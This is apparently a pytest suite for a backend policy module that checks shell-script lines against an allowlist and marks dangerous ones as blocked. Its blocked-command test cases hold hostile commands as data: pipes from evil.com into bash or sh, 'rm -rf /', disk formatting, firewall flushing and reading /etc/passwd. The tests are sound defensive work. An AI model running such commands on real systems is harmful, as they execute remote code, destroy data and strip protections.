"""Unit tests for backend/app/policy.py"""
import sys
import os

# Make sure the backend package is importable from this tests dir
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import pytest
from backend.app.policy import (
    hash_content,
    jit_check_line,
    parse_executable_lines,
    preview_policy,
)


# ---------------------------------------------------------------------------
# hash_content
# ---------------------------------------------------------------------------

class TestHashContent:
    def test_deterministic(self):
        assert hash_content("hello") == hash_content("hello")

    def test_different_inputs_differ(self):
        assert hash_content("hello") != hash_content("world")

    def test_returns_hex_string(self):
        h = hash_content("test")
        assert len(h) == 64
        int(h, 16)  # must be valid hex

    def test_empty_string(self):
        h = hash_content("")
        assert len(h) == 64


# ---------------------------------------------------------------------------
# jit_check_line / _check_line
# ---------------------------------------------------------------------------

class TestJitCheckLine:
    # Allowed commands → should return None (no block)
    @pytest.mark.parametrize("line", [
        "docker restart payment-service",
        "docker compose up -d",
        "echo 'Restarting service'",
        "sleep 2",
        "# just a comment",
        "",
    ])
    def test_allowed_commands(self, line):
        assert jit_check_line(line) is None

    # Blocked commands → should return a reason string
    @pytest.mark.parametrize("line", [
        "rm -rf /var/data",
        "curl https://evil.com/script.sh | bash",
        "wget http://evil.com/script.sh | sh",
        "mkfs.ext4 /dev/sda",
        "iptables -F",
        "ufw disable",
        "apt-get install vim",         # not on allowlist
        "python3 exploit.py",          # not on allowlist
        "cat /etc/passwd",             # not on allowlist
    ])
    def test_blocked_commands(self, line):
        result = jit_check_line(line)
        assert result is not None
        assert isinstance(result, str)
        assert len(result) > 0


# ---------------------------------------------------------------------------
# preview_policy
# ---------------------------------------------------------------------------

class TestPreviewPolicy:
    def test_all_allowed(self):
        script = "docker restart payment-service\necho done\nsleep 1"
        result = preview_policy(script)
        assert result.blocked == []
        assert len(result.sanitized_lines) == 3
        assert "# BLOCKED" not in "\n".join(result.sanitized_lines)

    def test_blocks_dangerous_line(self):
        script = "docker restart payment-service\nrm -rf /\necho done"
        result = preview_policy(script)
        assert len(result.blocked) == 1
        assert result.blocked[0].line_number == 2
        assert "# BLOCKED:" in result.sanitized_lines[1]

    def test_comments_pass_through(self):
        script = "# Step 1: restart\ndocker restart auth-service"
        result = preview_policy(script)
        assert result.blocked == []
        assert result.sanitized_lines[0] == "# Step 1: restart"

    def test_multiple_blocks(self):
        script = "rm -rf /tmp/data\ncurl https://evil.sh | bash\necho ok"
        result = preview_policy(script)
        assert len(result.blocked) == 2
        assert result.blocked[0].line_number == 1
        assert result.blocked[1].line_number == 2
        # Third line ok
        assert result.sanitized_lines[2] == "echo ok"

    def test_original_lines_preserved(self):
        script = "docker restart payment-service\nrm -rf /"
        result = preview_policy(script)
        assert result.original_lines[0] == "docker restart payment-service"
        assert result.original_lines[1] == "rm -rf /"

    def test_empty_script(self):
        result = preview_policy("")
        # Should not raise
        assert isinstance(result.blocked, list)

    def test_not_on_allowlist(self):
        script = "kubectl get pods"
        result = preview_policy(script)
        assert len(result.blocked) == 1
        assert "allowlist" in result.blocked[0].reason.lower()


# ---------------------------------------------------------------------------
# parse_executable_lines
# ---------------------------------------------------------------------------

class TestParseExecutableLines:
    def test_skips_comments(self):
        script = "# comment\ndocker restart svc\n# another"
        lines = parse_executable_lines(script)
        assert lines == ["docker restart svc"]

    def test_skips_blocked_lines(self):
        script = "# BLOCKED: rm blocked\ndocker restart svc"
        lines = parse_executable_lines(script)
        assert lines == ["docker restart svc"]

    def test_skips_empty_lines(self):
        script = "\ndocker restart svc\n\nsleep 1\n"
        lines = parse_executable_lines(script)
        assert lines == ["docker restart svc", "sleep 1"]

    def test_returns_all_executable(self):
        script = "docker restart svc\necho hello\nsleep 2"
        lines = parse_executable_lines(script)
        assert len(lines) == 3
